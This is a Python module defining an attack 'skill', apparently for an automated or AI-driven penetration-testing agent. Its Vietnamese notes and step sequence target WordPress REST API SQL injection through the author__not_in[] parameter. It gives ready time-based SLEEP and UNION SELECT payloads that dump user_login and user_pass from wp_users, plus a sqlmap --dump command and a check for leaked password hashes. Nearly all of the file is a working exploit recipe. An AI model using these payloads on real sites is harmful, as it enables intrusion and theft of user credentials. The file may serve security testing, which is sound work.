"""Skill: SQL injection → info leak (WordPress REST API / generic). vuln_class = sqli-info-leak."""
from __future__ import annotations

from .base import Skill

SKILL = Skill(
    vuln_class="sqli-info-leak",
    context=(
        "SQL injection rò rỉ dữ liệu (thường không có RCE). Với WordPress REST API: điểm chèn hay gặp "
        "là param mảng `author__not_in[]` ở /wp-json/wp/v2/posts, có thể chain với route-confusion "
        "/wp-json/batch/v1. Quy trình: (1) http_request GET /wp-json/ để lộ route; (2) test time-based "
        "(SLEEP) xác nhận injectable; (3) UNION-based rò `wp_users` (user_login, user_pass). Mục tiêu: "
        "làm response/echo chứa nội dung bảng `wp_users`. Có thể dùng sqlmap khi cần dò tự động."
    ),
    suggested_sequence=[
        "http_request GET /wp-json/ (liệt kê route REST)",
        "http_request GET /wp-json/wp/v2/posts?author__not_in[]=<payload time-based> (xác nhận)",
        "http_request UNION SELECT rò user_login/user_pass FROM wp_users",
        "hoặc sqlmap -u <url có param> --dump -T wp_users (khi http thủ công không ra)",
    ],
    payload_templates=[
        "/wp-json/wp/v2/posts?author__not_in[]=1)+AND+(SELECT+1+FROM+(SELECT+SLEEP(5))x)--+-",
        "/wp-json/wp/v2/posts?author__not_in[]=1)+UNION+SELECT+group_concat(user_login,0x3a,user_pass),2,3+FROM+wp_users--+-",
    ],
    oracle_hint="response/exfil chứa chuỗi `wp_users` hoặc hash mật khẩu WP (`$P$`/`$wp$`).",
)
